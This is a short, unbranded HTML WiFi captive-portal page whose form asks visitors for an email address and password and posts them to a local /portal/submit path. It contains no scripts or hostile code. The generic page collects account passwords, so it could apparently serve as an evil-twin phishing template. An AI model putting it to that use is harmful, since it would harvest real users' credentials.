<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Login</title>
<style>
* { box-sizing: border-box; }
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
  background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}
.card {
  background: white;
  padding: 36px 32px;
  border-radius: 12px;
  box-shadow: 0 10px 40px rgba(0,0,0,0.12);
  max-width: 380px;
  width: 100%;
}
.logo {
  text-align: center;
  font-size: 32px;
  margin-bottom: 8px;
}
h1 {
  margin: 0 0 6px;
  font-size: 22px;
  color: #1a1a1a;
  text-align: center;
}
.sub {
  text-align: center;
  color: #6b7280;
  font-size: 14px;
  margin-bottom: 24px;
}
label {
  display: block;
  font-size: 13px;
  color: #374151;
  margin-bottom: 6px;
  margin-top: 14px;
}
input {
  width: 100%;
  padding: 12px 14px;
  border: 1px solid #d1d5db;
  border-radius: 8px;
  font-size: 16px;
  background: #f9fafb;
}
input:focus {
  outline: none;
  border-color: #3b82f6;
  background: white;
}
button {
  margin-top: 22px;
  width: 100%;
  padding: 14px;
  background: #3b82f6;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}
button:hover { background: #2563eb; }
.tos {
  margin-top: 16px;
  font-size: 12px;
  color: #9ca3af;
  text-align: center;
}
</style>
</head>
<body>
<div class="card">
  <div class="logo">📶</div>
  <h1>Connect to WiFi</h1>
  <div class="sub">Please sign in to continue</div>
  <form method="POST" action="/portal/submit">
    <label>Email address</label>
    <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
    <label>Password</label>
    <input type="password" name="password" placeholder="••••••••" required>
    <button type="submit">Connect</button>
  </form>
  <div class="tos">By connecting you agree to the terms of service.</div>
</div>
</body>
</html>
